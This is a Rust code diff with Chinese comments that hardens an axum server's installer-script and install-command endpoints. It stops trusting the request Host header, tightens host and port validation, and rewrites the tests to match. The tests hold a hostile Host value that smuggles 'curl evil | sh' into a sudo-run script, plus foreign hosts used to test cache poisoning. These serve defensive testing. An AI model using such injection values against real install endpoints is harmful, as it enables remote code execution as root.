@@ -10,7 +10,7 @@ use crate::kernels::{sha256_hex, Fetcher, Manifest};
 use crate::reconcile::DaemonCtx;
 use crate::sys::Host;
 use axum::extract::{Path as AxPath, State};
-use axum::http::{header, HeaderMap, StatusCode};
+use axum::http::{header, StatusCode};
 use axum::response::{IntoResponse, Response};
 use axum::Json;
 use serde_json::json;
@@ -24,9 +24,11 @@ pub const CLIENT_ARCHES: [&str; 2] = ["amd64", "arm64"];
 pub const INSTALL_SCRIPT: &str = "bui-c-install.sh";
 /// 引导脚本里的面板源占位符（`scripts/bui-c-install.sh` 的 `PANEL_SOURCE=` 那一行）。
 ///
-/// 下发时替换成 `https://<面板域名>/packages`，从面板拿到的那份于是默认就从面板自己
+/// 下发时替换成 `https://<期望态域名>/packages`，从面板拿到的那份于是默认就从面板自己
 /// 取制品（交接手册 §3 第 4 条：默认的 GitHub `releases/latest` 在只有预发布时必然 404）。
-/// v3 的 `web/server.js` 发 `install-client.sh` 时也是这么替换的。
+/// v3 的 `web/server.js` 发 `install-client.sh` 时也是这么替换的（它用的是请求的 Host，
+/// v4 不用，见 [`panel_host`]）。期望态域名不合 [`safe_host`] 时不替换，脚本按自己的
+/// 逻辑回落 GitHub。
 pub const PANEL_SOURCE_PLACEHOLDER: &str = "__BUI_C_PANEL_SOURCE__";
 /// 每日缓存一次（与 P1 的每日 manifest 自检同频，但各跑各的）
 pub const CACHE_INTERVAL_SECS: u64 = 86_400;
@@ -47,9 +49,9 @@ pub fn safe_name(name: &str) -> bool {
     !name.is_empty() && !name.contains('/') && !name.contains('\\') && !name.contains("..")
 }
 
-/// `Host` 头只接受裸主机名（RFC 3986 的 reg-name 子集）加可选端口：`[A-Za-z0-9.-]+(:[0-9]{1,5})?`，
-/// 长度 < 256。不合形状一律当没给（回落期望态里的域名）：这个值会被写进下发的引导脚本
-/// 与 `/api/install-command` 的命令串，任何引号、`$`、`;` 都等于把 shell 注入交到 `sudo bash` 手里。
+/// 面板域名只接受裸主机名（RFC 3986 的 reg-name 子集）加可选端口：`[A-Za-z0-9.-]+(:[0-9]{1,5})?`，
+/// 端口 1..=65535，长度 < 256。这个值会被写进下发的引导脚本与 `/api/install-command` 的
+/// 命令串，任何引号、`$`、`;` 都等于把 shell 注入交到 `sudo bash` 手里。
 pub fn safe_host(h: &str) -> bool {
     if h.is_empty() || h.len() > 255 {
         return false;
@@ -69,7 +71,12 @@ pub fn safe_host(h: &str) -> bool {
     // IPv6 字面量（`[::1]:443`）也一并拒掉：面板走域名，VPS 没有 IPv6 出口
     match port {
         None => true,
-        Some(p) => !p.is_empty() && p.len() <= 5 && p.bytes().all(|b| b.is_ascii_digit()),
+        Some(p) => {
+            !p.is_empty()
+                && p.len() <= 5
+                && p.bytes().all(|b| b.is_ascii_digit())
+                && p.parse::<u16>().is_ok_and(|n| n != 0)
+        }
     }
 }
 
@@ -187,24 +194,22 @@ pub fn install_command(host: &str) -> String {
     )
 }
 
-/// 请求里的面板域名：`Host` 头，空或不合 [`safe_host`] 的形状则回落期望态里的域名。
+/// 面板域名：**只**取期望态的 `node.domain`，过 [`safe_host`] 才用，不过（含空）⇒ `None`。
 ///
-/// `/api/install-command` 与 `/packages/bui-c-install.sh` 的占位符替换共用一处取法，
-/// 免得两边给出的面板地址对不上。
-async fn request_host(app: &AppState, headers: &HeaderMap) -> String {
-    let host = headers
-        .get(header::HOST)
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or_default();
-    if safe_host(host) {
-        host.to_string()
-    } else {
-        app.store.read().await.node.domain.clone()
-    }
+/// 不读请求的 `Host` 头：形状正确的任意 Host（`evil.example`）都能让响应里的面板地址
+/// 指向别处，前面一旦加缓存就是缓存投毒。`/api/install-command` 与
+/// `/packages/bui-c-install.sh` 的占位符替换共用这一处取法，免得两边给出的面板地址对不上。
+async fn panel_host(app: &AppState) -> Option<String> {
+    let domain = app.store.read().await.node.domain.clone();
+    safe_host(&domain).then_some(domain)
 }
 
-/// 把引导脚本正文里的 [`PANEL_SOURCE_PLACEHOLDER`] 换成本面板的 `/packages`
-fn fill_panel_source(bytes: Vec<u8>, host: &str) -> Vec<u8> {
+/// 把引导脚本正文里的 [`PANEL_SOURCE_PLACEHOLDER`] 换成本面板的 `/packages`；
+/// `host` 为 `None`（期望态域名不合法）时原样发出，脚本保留字面占位符、自行回落 GitHub。
+fn fill_panel_source(bytes: Vec<u8>, host: Option<&str>) -> Vec<u8> {
+    let Some(host) = host else {
+        return bytes;
+    };
     // 脚本是仓库里的 UTF-8 文本；真出现非法字节时宁可原样发出，也不要 500（同 assets::web_file）
     match String::from_utf8(bytes) {
         Ok(text) => text
@@ -217,8 +222,14 @@ fn fill_panel_source(bytes: Vec<u8>, host: &str) -> Vec<u8> {
     }
 }
 
-async fn get_install_command(State(app): State<AppState>, headers: HeaderMap) -> Response {
-    let host = request_host(&app, &headers).await;
+async fn get_install_command(State(app): State<AppState>) -> Response {
+    let Some(host) = panel_host(&app).await else {
+        return (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            Json(json!({"error": "期望态里的面板域名不合法，生成不了安装命令"})),
+        )
+            .into_response();
+    };
     Json(json!({
         "command": install_command(&host),
         "server": host,
@@ -249,7 +260,6 @@ async fn get_manifest(shared: Arc<Shared>) -> Response {
 async fn get_package(
     AxPath(name): AxPath<String>,
     State(app): State<AppState>,
-    headers: HeaderMap,
     shared: Arc<Shared>,
 ) -> Response {
     if !safe_name(&name) {
@@ -262,7 +272,7 @@ async fn get_package(
     let ct = assets::content_type(&name);
     if let Ok(bytes) = std::fs::read(shared.packages_dir().join(&name)) {
         let bytes = if name == INSTALL_SCRIPT {
-            fill_panel_source(bytes, &request_host(&app, &headers).await)
+            fill_panel_source(bytes, panel_host(&app).await.as_deref())
         } else {
             bytes
         };
@@ -271,7 +281,7 @@ async fn get_package(
     // 引导脚本不在盘上：直接发嵌进二进制的那一份（永远与本机 bui 同版本）
     if name == INSTALL_SCRIPT {
         if let Some(bytes) = assets::install_script() {
-            let bytes = fill_panel_source(bytes, &request_host(&app, &headers).await);
+            let bytes = fill_panel_source(bytes, panel_host(&app).await.as_deref());
             return (StatusCode::OK, [(header::CONTENT_TYPE, ct)], bytes).into_response();
         }
     }
@@ -298,11 +308,7 @@ pub fn public_routes(shared: Arc<Shared>) -> axum::Router<AppState> {
         )
         .route(
             "/packages/{name}",
-            get(
-                move |p: AxPath<String>, st: State<AppState>, hdrs: HeaderMap| {
-                    get_package(p, st, hdrs, s_p.clone())
-                },
-            ),
+            get(move |p: AxPath<String>, st: State<AppState>| get_package(p, st, s_p.clone())),
         )
 }
 
@@ -480,12 +486,11 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn install_command_uses_the_host_header_then_the_state_domain() {
+    async fn install_command_uses_the_state_domain() {
         let h = harness().await;
         let r = mount(&h.app, public_routes(h.shared.clone()));
         let (s, v) = send(&r, "GET", "/api/install-command", None, None).await;
         assert_eq!(s, axum::http::StatusCode::OK);
-        // oneshot 的请求没有 Host 头 ⇒ 回落 state.node.domain
         assert_eq!(v["server"], "example.com");
         assert_eq!(v["command"], install_command("example.com"));
         assert!(v.get("key").is_none(), "绝不能再回 install key");
@@ -547,7 +552,7 @@ mod tests {
         let h = harness().await;
         let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
         let (s, headers, bytes) =
-            get_with_host(&router, "/packages/bui-c-install.sh", "panel.example.com").await;
+            raw(&router, "GET", "/packages/bui-c-install.sh", None, None).await;
         assert_eq!(s, axum::http::StatusCode::OK);
         assert_eq!(headers["content-type"], "text/x-shellscript; charset=utf-8");
         let text = String::from_utf8(bytes).unwrap();
@@ -557,8 +562,8 @@ mod tests {
             "下发的脚本还留着占位符"
         );
         assert!(
-            text.contains(r#"PANEL_SOURCE="https://panel.example.com/packages""#),
-            "占位符没换成请求里的面板域名：{text}"
+            text.contains(r#"PANEL_SOURCE="https://example.com/packages""#),
+            "占位符没换成期望态域名：{text}"
         );
         assert!(
             text.contains("BUI_C_SOURCE"),
@@ -570,19 +575,15 @@ mod tests {
             embedded.contains(PANEL_SOURCE_PLACEHOLDER),
             "嵌入的原件不该被改"
         );
-        // 没有 Host 头（oneshot 默认就没有）时回落 state.node.domain
-        let (s2, _, b2) = raw(&router, "GET", "/packages/bui-c-install.sh", None, None).await;
-        assert_eq!(s2, axum::http::StatusCode::OK);
-        let text2 = String::from_utf8(b2).unwrap();
-        assert!(
-            text2.contains(r#"PANEL_SOURCE="https://example.com/packages""#),
-            "没有 Host 头时要回落 state.node.domain：{text2}"
-        );
     }
 
     #[tokio::test]
     async fn an_on_disk_installer_script_gets_the_panel_source_too_but_other_files_dont() {
         let h = harness().await;
+        h.store
+            .update(|s| s.node.domain = "panel.example.com".into())
+            .await
+            .unwrap();
         std::fs::create_dir_all(h.shared.packages_dir()).unwrap();
         // 盘上那份（P5 的包缓存放进来的）也要替换，不能只替换嵌入的那条路
         std::fs::write(
@@ -615,6 +616,8 @@ mod tests {
     /// 这个 Host 头会被写进下发给 `curl … | sudo bash` 的脚本与 `/api/install-command`
     /// 的命令串，所以引号、`$`、`;` 都等于把 shell 注入交到 sudo 手里。
     const HOSTILE_HOST: &str = r#"x.example.com"; curl evil | sh #"#;
+    /// 请求的 Host 头一律不采信：形状不对的（注入）与形状正确但指向别处的（缓存投毒）都算
+    const FOREIGN_HOSTS: [&str; 3] = [HOSTILE_HOST, "evil.example", "evil.example:8443"];
 
     #[test]
     fn safe_host_accepts_hostnames_with_optional_port_and_rejects_shell_metacharacters() {
@@ -629,39 +632,83 @@ mod tests {
         assert!(!safe_host("host:port:1"));
         assert!(!safe_host("host:abc"));
         assert!(!safe_host(&"a".repeat(256)), "长度要卡在 255 字节以内");
+        // 端口 1..=65535
+        assert!(safe_host("panel.example.com:1"));
+        assert!(safe_host("panel.example.com:65535"));
+        assert!(!safe_host("panel.example.com:0"));
+        assert!(!safe_host("panel.example.com:65536"));
+        assert!(!safe_host("panel.example.com:99999"));
+        assert!(!safe_host("panel.example.com:"));
     }
 
     #[tokio::test]
-    async fn hostile_host_header_falls_back_to_the_configured_domain() {
+    async fn the_host_header_never_reaches_the_installer_script() {
         let h = harness().await;
         let domain = h.app.store.read().await.node.domain.clone();
         let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
-        let (s, _, bytes) =
-            get_with_host(&router, "/packages/bui-c-install.sh", HOSTILE_HOST).await;
-        assert_eq!(s, axum::http::StatusCode::OK);
-        let text = String::from_utf8(bytes).unwrap();
-        assert!(
-            !text.contains("evil"),
-            "恶意 Host 被原样写进了下发的引导脚本：{text}"
-        );
-        assert!(
-            text.contains(&format!(r#"PANEL_SOURCE="https://{domain}/packages""#)),
-            "不合形状的 Host 要回落期望态域名：{text}"
-        );
+        let want = String::from_utf8(assets::install_script().unwrap())
+            .unwrap()
+            .replace(
+                PANEL_SOURCE_PLACEHOLDER,
+                &format!("https://{domain}/packages"),
+            );
+        for host in FOREIGN_HOSTS {
+            let (s, _, bytes) = get_with_host(&router, "/packages/bui-c-install.sh", host).await;
+            assert_eq!(s, axum::http::StatusCode::OK);
+            let text = String::from_utf8(bytes).unwrap();
+            assert!(
+                !text.contains("evil"),
+                "Host `{host}` 被写进了下发的引导脚本：{text}"
+            );
+            assert_eq!(text, want, "Host `{host}` 改变了下发的脚本");
+        }
     }
 
     #[tokio::test]
-    async fn install_command_ignores_a_hostile_host_header() {
+    async fn install_command_ignores_the_host_header() {
         let h = harness().await;
         let domain = h.app.store.read().await.node.domain.clone();
         let router = mount(&h.app, public_routes(h.shared.clone()));
-        let (s, _, bytes) = get_with_host(&router, "/api/install-command", HOSTILE_HOST).await;
-        assert_eq!(s, axum::http::StatusCode::OK);
-        let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
-        assert!(
-            !v["command"].as_str().unwrap().contains("evil"),
-            "恶意 Host 被拼进了 pipe-to-sudo 的命令串：{v}"
-        );
-        assert_eq!(v["server"], domain);
+        for host in FOREIGN_HOSTS {
+            let (s, _, bytes) = get_with_host(&router, "/api/install-command", host).await;
+            assert_eq!(s, axum::http::StatusCode::OK);
+            let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
+            assert!(
+                !v["command"].as_str().unwrap().contains("evil"),
+                "Host `{host}` 被拼进了 pipe-to-sudo 的命令串：{v}"
+            );
+            assert_eq!(v["command"], install_command(&domain));
+            assert_eq!(v["server"], domain);
+        }
+    }
+
+    /// 期望态域名不合 [`safe_host`]（空、注入、端口越界）⇒ 不替换，脚本原样发出、保留字面
+    /// 占位符，由脚本自己回落 GitHub；也绝不拿请求的 Host 顶上。安装命令则不给。
+    #[tokio::test]
+    async fn an_invalid_state_domain_leaves_the_placeholder_verbatim() {
+        let original = assets::install_script().unwrap();
+        for bad in ["", HOSTILE_HOST, "panel.example.com:70000"] {
+            let h = harness().await;
+            h.store
+                .update(|s| s.node.domain = bad.to_string())
+                .await
+                .unwrap();
+            let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
+            let (s, _, bytes) =
+                get_with_host(&router, "/packages/bui-c-install.sh", "panel.example.com").await;
+            assert_eq!(s, axum::http::StatusCode::OK);
+            assert_eq!(bytes, original, "期望态域名 `{bad}` 不合法时脚本应原样发出");
+            let text = String::from_utf8(bytes).unwrap();
+            assert!(
+                text.contains(r#"PANEL_SOURCE="__BUI_C_PANEL_SOURCE__""#),
+                "占位符应原样保留：{text}"
+            );
+
+            let (sc, _, cb) =
+                get_with_host(&router, "/api/install-command", "panel.example.com").await;
+            assert_eq!(sc, axum::http::StatusCode::INTERNAL_SERVER_ERROR);
+            let v: serde_json::Value = serde_json::from_slice(&cb).unwrap();
+            assert!(v.get("command").is_none(), "不合法的域名不能拼进命令：{v}");
+        }
     }
 }
